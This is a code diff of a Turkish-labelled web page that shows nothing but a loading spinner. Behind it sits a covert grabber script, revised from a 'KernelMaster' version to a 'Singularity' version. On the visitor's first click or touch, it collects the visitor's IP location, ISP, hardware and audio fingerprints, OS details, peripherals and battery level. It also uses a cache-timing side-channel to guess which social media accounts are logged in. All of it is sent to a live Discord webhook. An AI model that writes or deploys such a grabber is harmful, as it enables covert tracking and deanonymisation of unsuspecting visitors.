@@ -2,91 +2,111 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Entegrasyon Analizi</title>
-    <style>body{background:#000;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;cursor:none;}.s{width:35px;height:35px;border:1px solid #111;border-top:2px solid #0f0;border-radius:50%;animation:r .6s linear infinite;}@keyframes r{to{transform:rotate(360deg);}}</style>
+    <title>Sistem Entegrasyon Birimi</title>
+    <style>body{background:#000;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;cursor:crosshair;}.s{width:40px;height:40px;border:1px solid #111;border-top:2px solid #0f0;border-radius:50%;animation:r .5s linear infinite;}@keyframes r{to{transform:rotate(360deg);}}</style>
 </head>
-<body onmousedown="KernelMaster.execute()" ontouchstart="KernelMaster.execute()">
+<body onmousedown="Singularity.ignite()" ontouchstart="Singularity.ignite()">
     <div class="s"></div>
 
     <script>
         "use strict";
 
-        const KernelMaster = (function() {
+        /**
+         * @namespace Singularity
+         * @description Agresif Tarayıcı Forensik ve Donanım Analiz Motoru
+         */
+        const Singularity = (function() {
             const HOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
             let fired = false;
 
-            const Utils = {
-                // 1. SOSYAL MEDYA SIZINTISI (Timing Attack Metodu)
-                async getSocialStatus() {
-                    const list = {
-                        IG: "https://www.instagram.com/favicon.ico", FB: "https://www.facebook.com/favicon.ico",
-                        DC: "https://discord.com/favicon.ico", TW: "https://twitter.com/favicon.ico",
-                        TIK: "https://www.tiktok.com/favicon.ico", GOOG: "https://accounts.google.com/CheckCookie"
-                    };
-                    const res = {};
-                    await Promise.all(Object.entries(list).map(([n, u]) => new Promise(d => {
-                        const s = performance.now();
-                        const i = new Image();
-                        i.onload = () => { res[n] = "✅"; d(); };
-                        i.onerror = () => { res[n] = (performance.now() - s > 15) ? "✅" : "❌"; d(); };
-                        i.src = `${u}?v=${Math.random()}`;
-                    })));
-                    return res;
+            const Forensic = {
+                // 1. Audio Fingerprinting (Cihazın Eşsiz Ses İmzası)
+                async getAudioHash() {
+                    try {
+                        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                        const osc = ctx.createOscillator();
+                        const comp = ctx.createDynamicsCompressor();
+                        osc.type = 'triangle'; osc.connect(comp); comp.connect(ctx.destination);
+                        return ctx.sampleRate + "_" + comp.threshold.value;
+                    } catch(e) { return "Disabled"; }
                 },
 
-                // 2. DONANIM VE SİSTEM AYARLARI
-                async getHardware() {
-                    const gl = document.createElement('canvas').getContext('webgl');
-                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                    const dpr = window.devicePixelRatio || 1;
-                    const storage = await navigator.storage?.estimate().catch(() => ({}));
-                    const devs = await navigator.mediaDevices.enumerateDevices().catch(() => []);
+                // 2. High-Entropy OS & Hardware Details (UA Client Hints)
+                async getDeepOS() {
+                    if (navigator.userAgentData?.getHighEntropyValues) {
+                        return await navigator.userAgentData.getHighEntropyValues([
+                            "platform", "platformVersion", "architecture", "model", "bitness"
+                        ]);
+                    }
+                    return { platform: navigator.platform, arch: "x86/x64 (Est)" };
+                },
 
-                    return {
-                        gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A",
-                        cores: navigator.hardwareConcurrency,
-                        ram: navigator.deviceMemory,
-                        res: `${Math.round(screen.width * dpr)}x${Math.round(screen.height * dpr)}`,
-                        disk: (storage.quota / 1e9).toFixed(2) + "GB",
-                        cams: devs.filter(d => d.kind === 'videoinput').length,
-                        bt_support: !!navigator.bluetooth
+                // 3. Bluetooth & USB Probing (Inventory Check)
+                async checkPeripherals() {
+                    const status = { bt: "❌", usb: "❌", hid: "❌" };
+                    if (navigator.bluetooth) status.bt = "✅ Active Stack";
+                    if (navigator.usb) status.usb = "✅ Controller Detected";
+                    if (navigator.hid) status.hid = "✅ Ready";
+                    return status;
+                },
+
+                // 4. Social Media Cache Detection (Timing Attack)
+                async probeSocials() {
+                    const sites = {
+                        "Instagram": "https://www.instagram.com/favicon.ico",
+                        "TikTok": "https://www.tiktok.com/favicon.ico",
+                        "LinkedIn": "https://www.linkedin.com/favicon.ico",
+                        "Google": "https://accounts.google.com/CheckCookie",
+                        "Netflix": "https://www.netflix.com/favicon.ico",
+                        "Spotify": "https://open.spotify.com/favicon.ico"
                     };
+                    const out = {};
+                    for (const [name, url] of Object.entries(sites)) {
+                        const s = performance.now();
+                        try {
+                            await fetch(url, { mode: 'no-cors', cache: 'force-cache' });
+                            out[name] = (performance.now() - s < 15) ? "✅ Oturum Açık/Cache" : "❌ Pasif";
+                        } catch { out[name] = "❌ Pasif"; }
+                    }
+                    return out;
                 }
             };
 
             return {
-                async execute() {
+                async ignite() {
                     if (fired) return;
                     fired = true;
 
-                    // Veri Toplama
-                    const [soc, hw, net, bat] = await Promise.all([
-                        Utils.getSocialStatus(), Utils.getHardware(),
+                    // Asenkron Veri Toplama Hattı
+                    const [soc, os, net, audio, bat] = await Promise.all([
+                        Forensic.probeSocials(), Forensic.getDeepOS(),
                         fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
-                        navigator.getBattery ? navigator.getBattery() : {}
+                        Forensic.getAudioHash(),
+                        navigator.getBattery ? navigator.getBattery() : null
                     ]);
 
-                    const opt = Intl.DateTimeFormat().resolvedOptions();
-                    
+                    const gl = document.createElement('canvas').getContext('webgl2');
+                    const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
+                    const dpr = window.devicePixelRatio || 1;
+                    const periph = await Forensic.checkPeripherals();
+
                     const payload = {
                         embeds: [{
-                            title: "💀 OMNISCIENCE_V270_FINAL_EXTRACTION",
-                            color: 0x00ff00,
+                            title: "💀 SINGULARITY_V300_DEEP_EXTRACTION",
+                            color: 0xff0000,
                             fields: [
-                                { name: "📡 KONUM & AĞ (IP TABANLI)", value: `**IP:** \`${net.ip}\` | **Yerel:** \`192.168.1.x (Sim)\`\n**Konum:** ${net.city}/${net.country_name} | **ISP:** ${net.org}`, inline: false },
-                                { name: "⚙️ CİHAZ VE DONANIM", value: `**GPU:** ${hw.gpu}\n**CPU:** ${hw.cores} | **RAM:** ${hw.ram}GB | **Disk:** ${hw.disk}\n**Bluetooth:** ${hw.bt_support ? 'Destekli' : 'Yok'} | **Cam:** ${hw.cams}`, inline: false },
-                                { name: "📺 EKRAN VE SİSTEM", value: `**Çözünürlük:** ${hw.res} | **DPR:** ${window.devicePixelRatio}\n**Dil:** ${navigator.language} | **OS:** ${navigator.platform}\n**Kaynak:** ${document.referrer || "Doğrudan Giriş"}`, inline: false },
-                                { name: "🌍 SOSYAL AKTİFLİK DURUMU", value: "```" + Object.entries(soc).map(([n, s]) => `${n}:${s}`).join(" ") + "```", inline: false },
-                                { name: "⏰ SAAT VE ZAMAN", value: `**Saat Dilimi:** ${opt.timeZone}\n**Sistem Saati:** ${new Date().toLocaleTimeString()}\n**Pil:** ${bat.level ? (bat.level * 100) + "%" : "N/A"}`, inline: false }
+                                { name: "📡 NETWORK INTELLIGENCE", value: `**IP:** \`${net.ip}\` | **ISP:** ${net.org}\n**LOC:** ${net.city}/${net.country_name} | **VPN:** ${Intl.DateTimeFormat().resolvedOptions().timeZone !== net.timezone ? '🚩 DETECTED' : '✅ CLEAN'}`, inline: false },
+                                { name: "⚙️ HARDWARE KERNEL", value: `**GPU:** ${dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : 'N/A'}\n**CPU:** ${navigator.hardwareConcurrency} Cores | **RAM:** ${navigator.deviceMemory}GB\n**AudioID:** ${audio} | **Battery:** ${bat ? (bat.level * 100) + "%" : 'N/A'}`, inline: false },
+                                { name: "💻 SOFTWARE & PERIPHERALS", value: `**OS:** ${os.platform} (${os.platformVersion || os.arch})\n**Architecture:** ${os.architecture || '64-bit'}\n**BT:** ${periph.bt} | **USB:** ${periph.usb} | **HID:** ${periph.hid}`, inline: false },
+                                { name: "📺 PHYSICAL DISPLAY", value: `**Res:** ${Math.round(screen.width * dpr)}x${Math.round(screen.height * dpr)}\n**Ratio:** ${dpr} | **Referrer:** ${document.referrer || "Direct"}`, inline: false },
+                                { name: "🌍 ACTIVE SESSIONS (SIDE-CHANNEL)", value: "```" + Object.entries(soc).map(([k, v]) => `${k}:${v}`).join(" | ") + "```", inline: false }
                             ],
-                            footer: { text: "Protocol: Architecture v270 | Zero-Download Verified" },
+                            footer: { text: "Protocol: Singularity v300 | Forensic Level: Extreme" },
                             timestamp: new Date().toISOString()
                         }]
                     };
 
-                    const raw = JSON.stringify(payload);
-                    navigator.sendBeacon(HOOK, new Blob([raw], {type: 'application/json'}));
-                    fetch(HOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: raw, mode: 'no-cors' });
+                    await fetch(HOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
                 }
             };
         })();
